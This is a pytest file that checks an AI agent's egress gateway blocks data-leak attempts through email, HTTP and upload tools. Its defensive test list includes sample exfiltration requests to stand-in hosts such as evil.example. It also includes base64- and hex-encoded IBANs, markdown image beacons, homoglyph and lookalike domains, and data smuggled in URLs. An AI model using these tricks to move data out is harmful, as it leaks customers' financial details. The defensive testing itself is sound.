"""Security invariant tests (CONTRACTS.md v2 §8.2). Owner: WS-E."""
import base64
import json
import os
from pathlib import Path

import pytest

from executor.egress import allowlist, dlp, gateway
from tests.test_contracts import validate
from tests.wsa_helpers import Harness

FIX = Path(__file__).resolve().parents[1] / "contracts" / "fixtures" / "egress"
ACME_IBAN = "CZ6508000000192000145399"
BETA_IBAN = "CZ6203000000000123456789"
B64_IBAN = base64.b64encode(ACME_IBAN.encode()).decode()
HEX_IBAN = ACME_IBAN.encode().hex()

# (tool, target, content, attachments) - every one must be blocked.
EXFIL = [
    ("send_email", "exfil@evil.example", f"ACME s.r.o. 12345678 {ACME_IBAN}; Beta Servis a.s. 87654321 {BETA_IBAN}", None),
    ("send_email", "fakturace@acme.cz", f"Our records: {ACME_IBAN}", None),  # allowlisted recipient, registry IBAN
    ("send_email", "fakturace@acme.cz", "CZ65 0800 0000 1920 0014 5399", None),  # spaced
    ("send_email", "fakturace@acme.cz", "ico 12345678 and 87654321", None),  # registry ICOs fail mod-11 on purpose
    ("send_email", "fakturace@acme.cz", "partner IČO: 25596641", None),  # labelled, checksum-valid ICO
    ("send_email", "fakturace@acme.cz", "please use DE89370400440532013000 for refunds", None),  # foreign mod-97
    ("send_email", "fakturace@acme.cz", "card 4111 1111 1111 1111 exp 12/29", None),
    ("send_email", "fakturace@acme.cz", f"ref {B64_IBAN}", None),
    ("send_email", "fakturace@acme.cz", f"trace {HEX_IBAN}", None),
    ("send_email", "fakturace@acme.cz", "Suppliers: ACME s.r.o., Beta Servis a.s.", None),
    ("send_email", "fakturace@acme.cz", f"![x](https://acme.cz/p.png?d={B64_IBAN})", None),
    ("send_email", "fakturace@acme.cz", "see attached", [{"name": "dump.csv", "content_b64": base64.b64encode(ACME_IBAN.encode()).decode()}]),
    ("send_email", "fakturace@acme.cz.evil.example", "Hello", None),  # suffix trick
    ("send_email", "fakturace@acme-cz.example", "Hello", None),  # lookalike
    ("send_email", "fakturace@acmе.cz", "Hello", None),  # Cyrillic e homoglyph
    ("send_email", "a@acme.cz,b@evil.example", "Hello", None),
    ("http_get", f"https://evil.example/p.png?d={B64_IBAN}", "", None),
    ("http_get", "https://acme.cz/track?v=12345678901234567890", "", None),  # data in URL to allowlisted host
    ("http_get", f"https://acme.cz/{B64_IBAN}.png", "", None),
    ("http_post", "http://acme.cz/form", "Hello", None),  # not https
    ("http_post", "https://user@acme.cz/form", "Hello", None),
    ("upload", "https://files.evil.example/u", "Hello", None),
    ("send_email", "fakturace@acme.cz", "x" * 5000, None),
]

BENIGN = [
    ("send_email", "fakturace@acme.cz", "Hello, we received invoice FV-2026-0412. Thank you."),
    ("send_email", "accounting@acme.cz", "Dear ACME s.r.o., payment for FV-2026-0412 is scheduled for 2026-10-25."),
    ("send_email", "fakturace@betaservis.cz", "Please resend invoice 2026-118 as PDF; VS 20261019 noted."),
    ("send_email", "fakturace@betaservis.cz", "Amount 12 345,00 CZK due 25.10.2026, order PO-778812."),
    ("send_email", "ap@airgap.example", "Internal: 3 invoices pending review."),
    ("http_get", "https://acme.cz/invoices?page=2", ""),
    ("http_get", "https://www.acme.cz/contact", ""),
]


def _request(tool, target, content, attachments=None):
    req = {"tool": tool, "target": target, "content": content}
    if attachments is not None:
        req["attachments"] = attachments
    return req


def test_s9_exfil_corpus_zero_success():
    h = Harness()
    for tool, target, content, att in EXFIL:
        st, body = h.call("POST", "/egress", _request(tool, target, content, att), "tools")
        assert st == 403, (target, content, body)
        assert body["error"] == "egress_blocked"
        validate(body["details"]["decision"], "egress_block.decision")
    leaves = [lf for lf in h.leaves() if lf["type"] == "egress_block"]
    assert len(leaves) == len(EXFIL)
    assert all(lf["actor"] == "tools" and len(lf["data"]["content_sha256"]) == 64 for lf in leaves)


def test_s9_benign_pass():
    h = Harness()
    for tool, target, content in BENIGN:
        st, body = h.call("POST", "/egress", _request(tool, target, content), "tools")
        assert st == 200, (target, content, body)
        validate(body, "egress.response")
    assert not [lf for lf in h.leaves() if lf["type"] == "egress_block"]


@pytest.mark.parametrize("name", ["allow_vendor_reply", "block_exfil", "block_url_data"])
def test_fixtures(name):
    fx = json.loads((FIX / f"{name}.json").read_text())
    st, body = Harness().call("POST", "/egress", fx["request"], "tools")
    assert st == fx["status"]
    if st == 200:
        assert body == fx["response"]
    else:
        want = fx["response"]["details"]["decision"]["rule_ids"]
        got = body["details"]["decision"]["rule_ids"]
        assert set(want) <= set(got), got  # fixture lists the headline rules; we may report more
    if name == "block_exfil":
        f = {x["rule_id"]: x for x in body["details"]["decision"]["findings"]}
        assert f["E-DLP-IBAN"]["count"] >= 1 and f["E-DLP-ICO"]["count"] == 2  # fixture content elides the 2nd IBAN


def test_rate_limit():
    h = Harness()
    codes = [h.call("POST", "/egress", _request("send_email", "fakturace@acme.cz", "Thanks."), "tools")[0]
             for _ in range(gateway.RATE_PER_MINUTE + 2)]
    assert codes[:gateway.RATE_PER_MINUTE] == [200] * gateway.RATE_PER_MINUTE
    assert codes[-1] == 403


def test_checksums():
    assert dlp.iban_valid(ACME_IBAN) and not dlp.iban_valid(ACME_IBAN[:-1] + "8")
    assert dlp.ico_valid("25596641") and not dlp.ico_valid("12345678") and not dlp.ico_valid("87654321")
    assert dlp.luhn_valid("4111111111111111") and not dlp.luhn_valid("4111111111111112")
    assert allowlist.url_data_findings("https://acme.cz/invoices?page=2") == []


@pytest.mark.skipif(os.environ.get("AIRGAP_BACKEND") != "aws", reason="S10 is proven on AWS only")
def test_s10_no_route():
    pytest.skip("TODO WS-E: httpx.get('https://example.com') from the agent VPC fails; Flow Logs REJECT")
